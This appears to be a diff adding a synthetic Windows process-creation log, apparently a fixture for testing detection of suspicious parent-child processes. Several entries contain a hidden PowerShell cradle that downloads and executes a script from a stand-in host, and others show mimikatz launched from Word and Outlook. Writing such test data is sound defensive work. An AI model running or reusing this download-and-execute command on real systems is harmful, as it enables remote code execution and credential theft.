@@ -1,0 +1,30 @@
+[2025-05-23 22:46:59] Parent: outlook.exe | Child: powershell.exe | CommandLine: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evilscript.biz/ps1')
+[2025-05-23 22:45:59] Parent: winword.exe | Child: mimikatz.exe | CommandLine: mimikatz.exe /c something
+[2025-05-23 22:44:59] Parent: explorer.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:43:59] Parent: outlook.exe | Child: mimikatz.exe | CommandLine: mimikatz.exe /c something
+[2025-05-23 22:42:59] Parent: outlook.exe | Child: powershell.exe | CommandLine: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evilscript.biz/ps1')
+[2025-05-23 22:41:59] Parent: winword.exe | Child: mimikatz.exe | CommandLine: mimikatz.exe /c something
+[2025-05-23 22:40:59] Parent: outlook.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:39:59] Parent: winword.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:38:59] Parent: winword.exe | Child: mimikatz.exe | CommandLine: mimikatz.exe /c something
+[2025-05-23 22:37:59] Parent: winword.exe | Child: mimikatz.exe | CommandLine: mimikatz.exe /c something
+[2025-05-23 22:36:59] Parent: winword.exe | Child: powershell.exe | CommandLine: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evilscript.biz/ps1')
+[2025-05-23 22:35:59] Parent: winword.exe | Child: powershell.exe | CommandLine: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evilscript.biz/ps1')
+[2025-05-23 22:34:59] Parent: explorer.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:33:59] Parent: explorer.exe | Child: mimikatz.exe | CommandLine: mimikatz.exe /c something
+[2025-05-23 22:32:59] Parent: outlook.exe | Child: mimikatz.exe | CommandLine: mimikatz.exe /c something
+[2025-05-23 22:31:59] Parent: winword.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:30:59] Parent: outlook.exe | Child: powershell.exe | CommandLine: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evilscript.biz/ps1')
+[2025-05-23 22:29:59] Parent: winword.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:28:59] Parent: winword.exe | Child: mimikatz.exe | CommandLine: mimikatz.exe /c something
+[2025-05-23 22:27:59] Parent: explorer.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:26:59] Parent: outlook.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:25:59] Parent: outlook.exe | Child: powershell.exe | CommandLine: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evilscript.biz/ps1')
+[2025-05-23 22:24:59] Parent: winword.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:23:59] Parent: outlook.exe | Child: mimikatz.exe | CommandLine: mimikatz.exe /c something
+[2025-05-23 22:22:59] Parent: outlook.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:21:59] Parent: explorer.exe | Child: mimikatz.exe | CommandLine: mimikatz.exe /c something
+[2025-05-23 22:20:59] Parent: outlook.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:19:59] Parent: winword.exe | Child: mimikatz.exe | CommandLine: mimikatz.exe /c something
+[2025-05-23 22:18:59] Parent: winword.exe | Child: cmd.exe | CommandLine: cmd.exe /c something
+[2025-05-23 22:17:59] Parent: winword.exe | Child: powershell.exe | CommandLine: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evilscript.biz/ps1')
